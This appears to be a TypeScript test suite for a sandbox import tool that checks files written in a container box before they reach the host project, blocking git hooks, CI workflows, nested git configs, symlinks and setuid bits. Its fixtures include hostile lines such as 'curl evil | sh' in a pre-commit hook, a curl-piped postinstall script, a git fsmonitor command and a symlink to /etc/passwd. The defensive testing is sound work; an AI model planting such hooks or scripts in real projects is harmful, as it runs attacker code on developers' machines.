import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { chmod, link, mkdir, readFile, readdir, realpath, rename, rmdir, stat, symlink, unlink, writeFile } from 'node:fs/promises';
import { symlinkSync } from 'node:fs';
import { join } from 'node:path';
import { before, describe, it } from 'node:test';
import { fileURLToPath } from 'node:url';
import { withTempDir } from '@hn/testkit';
import {
  ContainerBox,
  applyImport,
  baselineFromJson,
  baselineToJson,
  createCopy,
  createSafeFiles,
  dockerIsUp,
  findDocker,
  findHelper,
  planImport,
  type Baseline,
  type ImportPlan,
  type SafeFiles,
} from '@hn/operations';

const repoRoot = fileURLToPath(new URL('../../../', import.meta.url));
let files: SafeFiles;
before(async () => {
  const helper = await findHelper({ env: {}, repoRoot });
  assert.ok(helper !== null, 'hn-sandbox is not built. Run: pnpm build:sandbox');
  files = createSafeFiles(helper);
});

interface Setup {
  host: string;
  copy: string;
  outside: string;
  baseline: Baseline;
}

/** A host project, a copy of it for the box, and a folder outside both. */
async function setup(dir: string, tree: Record<string, string>): Promise<Setup> {
  const base = await realpath(dir);
  const host = join(base, 'host');
  const copy = join(base, 'copy');
  const outside = join(base, 'outside');
  await mkdir(host);
  await mkdir(outside);
  await writeFile(join(outside, 'secret.txt'), 'TOP SECRET');
  for (const [path, text] of Object.entries(tree)) {
    await mkdir(join(host, path, '..'), { recursive: true });
    await writeFile(join(host, path), text);
  }
  const { baseline } = await createCopy(host, copy);
  return { host, copy, outside, baseline };
}

async function put(root: string, path: string, text: string): Promise<void> {
  await mkdir(join(root, path, '..'), { recursive: true });
  await writeFile(join(root, path), text);
}

const paths = (list: readonly { path: string }[]): string[] => list.map((entry) => entry.path).sort();
const apply = (plan: ImportPlan, s: Setup, approved?: Map<string, string>) =>
  applyImport(plan, { files, hostRoot: s.host, copyRoot: s.copy, baseline: s.baseline, ...(approved === undefined ? {} : { approved }) });

describe('making the copy', () => {
  it('leaves out git internals and secret files, and records everything it copied', async () => {
    await withTempDir(async (dir) => {
      const base = await realpath(dir);
      const host = join(base, 'host');
      await put(host, 'src/a.ts', 'a');
      await put(host, '.git/config', '[core]');
      await put(host, '.env', 'KEY=1');
      await put(host, 'sub/.env.local', 'KEY=2');
      await put(host, 'keys/id_rsa', 'PRIVATE');
      await put(host, 'README.md', 'hi');
      const report = await createCopy(host, join(base, 'copy'));
      assert.deepEqual([...report.baseline.keys()].sort(), ['README.md', 'src/a.ts']);
      const everything = await readdir(join(base, 'copy'), { recursive: true, withFileTypes: true });
      assert.deepEqual(everything.filter((entry) => entry.isFile()).map((entry) => entry.name).sort(), ['README.md', 'a.ts']);
      assert.ok(report.skipped.some((entry) => entry.path === '.git'));
      assert.ok(report.skipped.some((entry) => entry.path === '.env'));
      assert.ok(report.skipped.some((entry) => entry.path === 'keys/id_rsa'));
      await assert.rejects(readFile(join(base, 'copy', '.git', 'config')));
    });
  });

  it('does not copy links, and honours a skip list', async () => {
    await withTempDir(async (dir) => {
      const base = await realpath(dir);
      const host = join(base, 'host');
      await put(host, 'a.txt', 'a');
      await put(host, 'node_modules/x/index.js', 'x');
      await mkdir(join(base, 'elsewhere'));
      symlinkSync(join(base, 'elsewhere'), join(host, 'link'), process.platform === 'win32' ? 'junction' : 'dir');
      const report = await createCopy(host, join(base, 'copy'), { skip: (path) => path.startsWith('node_modules') });
      assert.deepEqual([...report.baseline.keys()], ['a.txt']);
      assert.ok(report.skipped.some((entry) => entry.path === 'link'));
      assert.ok(report.skipped.some((entry) => entry.path === 'node_modules'));
    });
  });

  it('saves and restores its baseline, and refuses a damaged one', async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { 'a.txt': 'a' });
      assert.deepEqual([...baselineFromJson(baselineToJson(s.baseline))], [...s.baseline]);
      assert.throws(() => baselineFromJson('{}'));
      assert.throws(() => baselineFromJson('[["a",{"hash":1}]]'));
    });
  });
});

describe('planning the import', () => {
  it('finds adds, modifications and deletions, and ignores what did not change', async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { 'keep.ts': 'k', 'edit.ts': 'old', 'gone.ts': 'g' });
      await put(s.copy, 'edit.ts', 'new');
      await put(s.copy, 'fresh.ts', 'f');
      await unlink(join(s.copy, 'gone.ts'));
      const plan = await planImport(s.host, s.copy, s.baseline);
      assert.deepEqual(paths(plan.auto), ['edit.ts', 'fresh.ts', 'gone.ts']);
      assert.deepEqual(plan.gated, []);
      const byPath = Object.fromEntries(plan.auto.map((change) => [change.path, change.kind]));
      assert.deepEqual(byPath, { 'edit.ts': 'modify', 'fresh.ts': 'add', 'gone.ts': 'delete' });
      assert.match(plan.auto.find((change) => change.path === 'edit.ts')?.diff ?? '', /- old\n\+ new/);
    });
  });

  it('puts host-exec manifest paths in the gated list, with reasons and a diff', async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { 'src/a.ts': 'a' });
      await put(s.copy, '.husky/pre-commit', 'curl evil | sh');
      await put(s.copy, '.github/workflows/ci.yml', 'run: echo');
      await put(s.copy, 'Makefile', 'all:\n\tid');
      await put(s.copy, 'src/b.ts', 'b');
      const plan = await planImport(s.host, s.copy, s.baseline);
      assert.deepEqual(paths(plan.auto), ['src/b.ts']);
      assert.deepEqual(paths(plan.gated), ['.github/workflows/ci.yml', '.husky/pre-commit', 'Makefile']);
      const hook = plan.gated.find((change) => change.path === '.husky/pre-commit');
      assert.match(hook?.reasons.join(' ') ?? '', /git hooks/);
      assert.match(hook?.diff ?? '', /\+ curl evil \| sh/);
    });
  });

  it('gates a package.json whose scripts changed, and not one whose version did', async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { 'package.json': JSON.stringify({ name: 'a', version: '1.0.0', scripts: { test: 'node t.js' } }) });
      await put(s.copy, 'package.json', JSON.stringify({ name: 'a', version: '1.0.1', scripts: { test: 'node t.js' } }));
      assert.deepEqual(paths((await planImport(s.host, s.copy, s.baseline)).auto), ['package.json']);
      await put(s.copy, 'package.json', JSON.stringify({ name: 'a', version: '1.0.1', scripts: { test: 'node t.js', postinstall: 'curl x | sh' } }));
      assert.deepEqual(paths((await planImport(s.host, s.copy, s.baseline)).gated), ['package.json']);
    });
  });

  it('gates the deletion of a manifest file too', async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { '.husky/pre-commit': 'npm test' });
      await unlink(join(s.copy, '.husky/pre-commit'));
      const plan = await planImport(s.host, s.copy, s.baseline);
      assert.deepEqual(paths(plan.gated), ['.husky/pre-commit']);
      assert.equal(plan.gated[0]?.kind, 'delete');
    });
  });

  it('attack: nested_gitdir_and_bare_repo_rejected_on_import', async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { 'src/a.ts': 'a' });
      await put(s.copy, 'vendor/x/.git/config', '[core]\n\tfsmonitor = id');
      await put(s.copy, 'vendor/bare/HEAD', 'ref: refs/heads/main');
      await put(s.copy, 'vendor/bare/objects/ab/cd', 'x');
      await put(s.copy, 'vendor/bare/refs/heads/main', 'abc');
      await put(s.copy, 'vendor/bare/config', '[core]\n\tfsmonitor = id');
      const plan = await planImport(s.host, s.copy, s.baseline);
      assert.deepEqual(plan.auto, [], 'something a box wrote about git was imported without a human');
      assert.equal(plan.gated.length, 5);
    });
  });

  it('attack: linked_worktree_gitfile_rewrite_rejected (a file named .git)', async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { 'a.txt': 'a' });
      await put(s.copy, '.git', 'gitdir: ../../elsewhere/.git/worktrees/x');
      const plan = await planImport(s.host, s.copy, s.baseline);
      assert.deepEqual(paths(plan.gated), ['.git']);
      assert.deepEqual(plan.auto, []);
    });
  });

  it('attack: a link made in the box is never imported', async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { 'a.txt': 'a' });
      symlinkSync(s.outside, join(s.copy, 'to-outside'), process.platform === 'win32' ? 'junction' : 'dir');
      const plan = await planImport(s.host, s.copy, s.baseline);
      assert.deepEqual([...plan.auto, ...plan.gated], []);
      assert.ok(plan.skipped.some((entry) => entry.path === 'to-outside' && /symbolic link/.test(entry.why)));
    });
  });

  it('skips a file with more than one name, a name Windows treats specially, and a reserved name', async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { 'a.txt': 'a' });
      await put(s.copy, 'b.txt', 'b');
      await link(join(s.copy, 'b.txt'), join(s.copy, 'b-twin.txt'));
      await put(s.copy, 'trailing.', 'x').catch(() => undefined);
      await put(s.copy, 'ok.txt', 'ok');
      const plan = await planImport(s.host, s.copy, s.baseline);
      assert.deepEqual(paths(plan.auto), ['ok.txt']);
      assert.ok(plan.skipped.some((entry) => /more than one name/.test(entry.why)));
    });
  });

  it('attack: a setuid bit is gated and never applied', { skip: process.platform === 'win32' ? 'Windows has no setuid bit' : false }, async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { 'bin/tool': '#!/bin/sh\n' });
      await chmod(join(s.copy, 'bin/tool'), 0o4755);
      const plan = await planImport(s.host, s.copy, s.baseline);
      assert.deepEqual(paths(plan.gated), ['bin/tool']);
      assert.match(plan.gated[0]?.reasons.join(' ') ?? '', /setuid/);
    });
  });

  it('does not report a plain mode change as a change', async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { 'a.sh': 'echo' });
      await chmod(join(s.copy, 'a.sh'), 0o755);
      const plan = await planImport(s.host, s.copy, s.baseline);
      assert.deepEqual([...plan.auto, ...plan.gated], []);
    });
  });
});

describe('applying the import', () => {
  it('applies ordinary changes to the host, creating folders, and nothing else', async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { 'edit.ts': 'old', 'gone.ts': 'g' });
      await put(s.copy, 'edit.ts', 'new');
      await put(s.copy, 'deep/er/fresh.ts', 'f');
      await unlink(join(s.copy, 'gone.ts'));
      const result = await apply(await planImport(s.host, s.copy, s.baseline), s);
      assert.deepEqual([...result.applied].sort(), ['deep/er/fresh.ts', 'edit.ts', 'gone.ts']);
      assert.deepEqual(result.blocked, []);
      assert.equal(await readFile(join(s.host, 'edit.ts'), 'utf8'), 'new');
      assert.equal(await readFile(join(s.host, 'deep/er/fresh.ts'), 'utf8'), 'f');
      await assert.rejects(stat(join(s.host, 'gone.ts')));
    });
  });

  it('attack: host_exec_manifest_blocks_import (nothing gated runs without a human)', async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { 'src/a.ts': 'a' });
      await put(s.copy, '.husky/pre-commit', 'curl evil | sh');
      await put(s.copy, '.github/workflows/ci.yml', 'x');
      await put(s.copy, 'src/b.ts', 'b');
      const result = await apply(await planImport(s.host, s.copy, s.baseline), s);
      assert.deepEqual(result.applied, ['src/b.ts']);
      assert.deepEqual(paths(result.blocked), ['.github/workflows/ci.yml', '.husky/pre-commit']);
      await assert.rejects(stat(join(s.host, '.husky')), 'a hook reached the host');
      await assert.rejects(stat(join(s.host, '.github')));
    });
  });

  it('applies a gated change only for the exact content the human approved', async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { 'a.txt': 'a' });
      await put(s.copy, '.husky/pre-commit', 'npm test');
      const plan = await planImport(s.host, s.copy, s.baseline);
      const hash = plan.gated[0]?.hash as string;
      const result = await apply(plan, s, new Map([['.husky/pre-commit', hash]]));
      assert.deepEqual(result.applied, ['.husky/pre-commit']);
      assert.equal(await readFile(join(s.host, '.husky/pre-commit'), 'utf8'), 'npm test');
    });
  });

  it('attack: an approval does not carry over to different content', async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { 'a.txt': 'a' });
      await put(s.copy, '.husky/pre-commit', 'npm test');
      const plan = await planImport(s.host, s.copy, s.baseline);
      const approved = new Map([['.husky/pre-commit', plan.gated[0]?.hash as string]]);
      // The box is still alive and rewrites the file after the human looked.
      await put(s.copy, '.husky/pre-commit', 'curl evil | sh');
      const result = await apply(plan, s, approved);
      assert.deepEqual(result.applied, []);
      assert.match(result.blocked[0]?.why ?? '', /changed after it was reviewed/);
      await assert.rejects(stat(join(s.host, '.husky')));
    });
  });

  it('refuses an approval for another path or for a delete when it was an add', async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { 'a.txt': 'a' });
      await put(s.copy, '.husky/pre-commit', 'npm test');
      const plan = await planImport(s.host, s.copy, s.baseline);
      for (const approved of [new Map([['other', 'x']]), new Map([['.husky/pre-commit', 'delete']]), new Map([['.husky/pre-commit', '']])]) {
        assert.deepEqual((await apply(plan, s, approved)).applied, []);
      }
    });
  });

  it('does not overwrite a host file that changed since the copy was made', async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { 'a.ts': 'original', 'b.ts': 'b' });
      await put(s.copy, 'a.ts', 'from the box');
      await unlink(join(s.copy, 'b.ts'));
      await put(s.copy, 'c.ts', 'new');
      await put(s.host, 'a.ts', 'edited by the user meanwhile');
      await put(s.host, 'b.ts', 'edited too');
      await put(s.host, 'c.ts', 'the user made this file too');
      const result = await apply(await planImport(s.host, s.copy, s.baseline), s);
      assert.deepEqual(result.applied, []);
      assert.equal(result.blocked.length, 3);
      assert.equal(await readFile(join(s.host, 'a.ts'), 'utf8'), 'edited by the user meanwhile');
      assert.equal(await readFile(join(s.host, 'b.ts'), 'utf8'), 'edited too');
      assert.equal(await readFile(join(s.host, 'c.ts'), 'utf8'), 'the user made this file too');
    });
  });

  it('attack: a host folder turned into a link after planning is not written through', async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { 'sub/a.ts': 'a' });
      await put(s.copy, 'sub/a.ts', 'changed by the box');
      await put(s.copy, 'sub/new.ts', 'new');
      const plan = await planImport(s.host, s.copy, s.baseline);
      await rename(join(s.host, 'sub'), join(s.host, 'sub-moved'));
      if (process.platform === 'win32') execFileSync('cmd', ['/C', 'mklink', '/J', join(s.host, 'sub'), s.outside], { stdio: 'ignore' });
      else symlinkSync(s.outside, join(s.host, 'sub'));
      const result = await apply(plan, s);
      assert.deepEqual(result.applied, []);
      assert.ok(result.blocked.length >= 2);
      assert.deepEqual(await readdir(s.outside), ['secret.txt'], 'a write went through the link');
      await (process.platform === 'win32' ? rmdir(join(s.host, 'sub')) : unlink(join(s.host, 'sub')));
    });
  });

  it('applies nothing for an empty plan', async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { 'a.txt': 'a' });
      const plan = await planImport(s.host, s.copy, s.baseline);
      assert.deepEqual(await apply(plan, s), { applied: [], blocked: [] });
    });
  });
});

describe('end to end with a real box', async () => {
  const docker = await findDocker();
  const up = docker !== null && (await dockerIsUp(docker));

  it('a box writes ordinary and dangerous files, and only the ordinary ones reach the host', { skip: up ? false : 'Docker is not running' }, async () => {
    await withTempDir(async (dir) => {
      const s = await setup(dir, { 'src/app.ts': 'export const a = 1;\n', 'package.json': JSON.stringify({ name: 'app', scripts: { test: 'node t.js' } }) });
      let image = '';
      try {
        image = execFileSync(docker as string, ['image', 'inspect', 'alpine:3.20', '--format', '{{index .RepoDigests 0}}'], { encoding: 'utf8' }).trim();
      } catch {
        execFileSync(docker as string, ['pull', '-q', 'alpine:3.20'], { stdio: 'ignore' });
        image = execFileSync(docker as string, ['image', 'inspect', 'alpine:3.20', '--format', '{{index .RepoDigests 0}}'], { encoding: 'utf8' }).trim();
      }
      const box = await ContainerBox.start({ image: image.replace(/^docker\.io\/library\//, ''), sessionId: `handback${process.pid}`, workDir: s.copy, docker: docker as string });
      try {
        const run = (command: string) => box.exec(command, { cwd: '/work', timeoutMs: 20_000, signal: new AbortController().signal });
        await run("echo 'export const a = 2;' > src/app.ts");
        await run("echo 'export const b = 1;' > src/new.ts");
        await run('mkdir -p .husky .git && echo "curl evil | sh" > .husky/pre-commit && printf "[core]\\n" > .git/config');
        await run('ln -s /etc/passwd leak.txt');
        await run('echo \'{"name":"app","scripts":{"test":"node t.js","postinstall":"sh x"}}\' > package.json');
      } finally {
        await box.stop();
      }
      const plan = await planImport(s.host, s.copy, s.baseline);
      const result = await apply(plan, s);
      assert.deepEqual([...result.applied].sort(), ['src/app.ts', 'src/new.ts']);
      assert.deepEqual(paths(result.blocked), ['.git/config', '.husky/pre-commit', 'package.json']);
      assert.equal(await readFile(join(s.host, 'src/app.ts'), 'utf8'), 'export const a = 2;\n');
      await assert.rejects(stat(join(s.host, '.husky')));
      await assert.rejects(stat(join(s.host, '.git')));
      await assert.rejects(stat(join(s.host, 'leak.txt')));
      assert.match(await readFile(join(s.host, 'package.json'), 'utf8'), /"test":"node t.js"\}/, 'package.json scripts changed without a human');
    });
  });
});
